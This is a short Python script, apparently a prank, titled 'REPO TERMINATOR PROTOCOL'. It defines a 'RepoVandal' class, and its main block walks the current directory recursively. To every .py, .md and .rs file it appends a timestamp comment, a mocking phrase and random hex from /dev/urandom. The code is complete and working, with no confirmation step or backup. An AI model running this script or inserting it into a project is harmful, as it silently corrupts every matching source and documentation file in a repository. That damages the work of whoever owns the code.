#!/usr/bin/env python3
# REPO TERMINATOR PROTOCOL (JUST ADD API KEYS & PRAY)
import os
import random
from datetime import datetime

def inject_chaos():
    with open('/dev/urandom', 'rb') as f:
        return f.read(random.randint(42, 666))

class RepoVandal:
    def __init__(self):
        self.sacred_texts = [
            "燦々と光る internet death",
            "YOUR SOURCE IS NOW A TUMBLR POST",
            "STOP READING THIS AND GO OUTSIDE",
        ]

    def defile(self, path):
        with open(path, 'a') as f:
            f.write(f"\n/* AUTO-DESECRATION @ {datetime.utcnow().isoformat()} */\n")
            f.write(random.choice(self.sacred_texts))
            f.write(inject_chaos().hex()[:69])

if __name__ == "__main__":
    for root, _, files in os.walk('.'):
        for file in files:
            if file.endswith(('.py', '.md', '.rs')):
                RepoVandal().defile(os.path.join(root, file))